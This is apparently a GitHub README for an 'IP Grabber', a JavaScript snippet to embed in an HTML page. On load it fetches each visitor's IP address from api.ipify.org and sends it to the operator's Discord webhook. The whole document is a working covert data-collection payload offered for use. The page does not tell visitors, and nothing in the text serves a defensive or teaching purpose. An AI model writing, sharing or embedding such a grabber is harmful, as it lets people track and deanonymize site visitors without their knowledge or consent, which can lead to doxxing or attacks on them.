<h1 align="center">IP Grabber</h1>

<p align="center">
  <strong>A simple script to grab the user's IP address and send it to a Discord webhook.</strong>
</p>


## Description

This script fetches the user's IP address using `https://api.ipify.org` and sends it to a specified Discord webhook.

## How it Works

The script uses JavaScript's `fetch` API to send a GET request to `https://api.ipify.org` to obtain the user's IP address. It then sends a POST request to a Discord webhook URL with the obtained IP address as the payload.

## Usage

Simply include the script in your HTML file. Just make sure to replace **'YOUR_DISCORD_WEBHOOK'** with your actual Discord webhook URL.:

```html
<script>
  fetch('https://api.ipify.org')
    .then(response => response.text())
    .then(ip => fetch('YOUR_DISCORD_WEBHOOK', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: ip })
    }));
</script>
